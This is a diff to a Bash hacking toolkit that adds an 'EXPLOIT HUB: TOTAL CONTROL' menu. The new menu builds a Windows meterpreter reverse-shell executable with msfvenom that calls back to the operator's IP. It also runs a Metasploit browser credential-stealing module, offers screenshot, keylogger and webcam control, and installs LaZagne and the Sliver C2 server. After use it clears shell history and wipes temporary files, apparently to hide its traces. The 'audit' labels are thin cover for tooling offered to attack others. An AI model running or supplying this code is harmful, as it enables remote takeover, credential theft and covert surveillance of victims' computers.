@@ -655,6 +655,14 @@ TOOLS_DATA=(
     "instashell;https://github.com/thelinuxchoice/instashell/archive/refs/heads/master.zip;instashell.sh;chmod +x install.sh && ./install.sh"
 )
 
+# Дополнительные инструменты для EXPLOIT HUB
+TOOLS_DATA+=(
+    "metasploit;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh;msfconsole;chmod +x metasploit.sh && ./metasploit.sh"
+    "lazagne;https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip;laZagne.py;python3 -m pip install -r requirements.txt --break-system-packages"
+    "sliver;https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux;sliver-server;chmod +x sliver-server"
+    "exploitdb;https://github.com/offensive-security/exploitdb/archive/refs/heads/master.zip;searchsploit;ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit"
+)
+
 zero_clear() {
     rm -rf /tmp/* /root/.npm/_logs/* > /dev/null 2>&1
     sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
@@ -761,10 +769,44 @@ run_ghost_scan() {
     [ -n "$t" ] && nmap -F "$t"
 }
 
+# Дополнение к run_exploit_hub для управления и аудита ПК
+run_pc_control() {
+    echo -e "${B}>>> [ PC REMOTE CONTROL & AUDIT ] <<<${NC}"
+    echo -e "1) Payload Generator (Create EXE/LNK)"
+    echo -e "2) Password Stealer (Browser/System/Wifi)"
+    echo -e "3) Remote AV-Scanner (Check PC for threats)"
+    echo -e "4) Post-Exploit Menu (Screenshots/Keylogger)"
+    read -p ">> " pc_cmd
+
+    case $pc_cmd in
+        1)
+            read -p "LHOST (Your IP): " lh
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe
+            echo -e "${G}[+] Payload saved to /root/payload.exe${NC}"
+            ;;
+        2)
+            echo -e "${Y}[*] Extracting credentials...${NC}"
+            # Автоматический запуск модулей Mimikatz и Creds через Metasploit
+            msfconsole -q -x "use post/windows/gather/credentials/browser_helper; set SESSION $SESS_ID; run; exit"
+            ;;
+        3)
+            echo -e "${Y}[*] Remote System Scan...${NC}"
+            # Проверка установленного ПО и поиск уязвимостей (CVE)
+            nmap --script smb-vuln* -p 445 $target
+            ;;
+        4)
+            echo -e "${B}Active Control: 1-Screenshot  2-Keylog  3-Webcam${NC}"
+            read -p "> " act
+            [[ $act == 1 ]] && msfconsole -q -x "sessions -i $SESS_ID -c screenshot"
+            ;;
+    esac
+}
+
+
 run_exploit_hub() {
     clear; zero_clear
     echo -e "${Y}>>> [ EXPLOIT HUB: TOTAL CONTROL ] <<<${NC}"
-    echo -e "1) PhoneSploit Pro (Android)  2) SQLmap/Web  3) PC/Network"
+    echo -e "1) PhoneSploit Pro (Android)  2) SQLmap/Web  3) PC/Network 4) PC Control"
     read -p ">> " ex_opt
 
     case $ex_opt in
@@ -781,6 +823,7 @@ run_exploit_hub() {
             read -p "Target IP: " t
             nmap -sV --script vuln "$t"
             ;;
+4)run_pc_control ;;
     esac
     zero_clear; history -c
 }
